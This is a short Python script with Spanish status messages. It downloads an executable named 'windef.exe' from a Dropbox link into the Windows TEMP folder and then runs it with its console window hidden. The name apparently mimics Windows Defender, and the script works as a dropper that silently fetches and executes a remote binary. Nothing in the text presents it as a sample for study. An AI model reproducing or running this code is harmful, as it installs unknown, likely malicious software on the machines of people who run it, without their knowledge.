import requests
import subprocess
import os

url = 'https://dl.dropbox.com/scl/fi/u8qpwjrtniiyqlv48o7h4/windef.exe?rlkey=vep7ia8tg6v0tb6uzsjjv0960&dl=0'

def start():
    archivo_destino = os.path.join(os.environ['TEMP'], 'windef.exe')

    print(f'Descargando {url}...')
    response = requests.get(url)

    with open(archivo_destino, 'wb') as archivo:
        archivo.write(response.content)

    print(f'Archivo descargado en: {archivo_destino}')

    print(f'Ejecutando {archivo_destino}...')
    subprocess.run([archivo_destino], creationflags=subprocess.CREATE_NO_WINDOW, shell=True)

    print('Proceso completado.')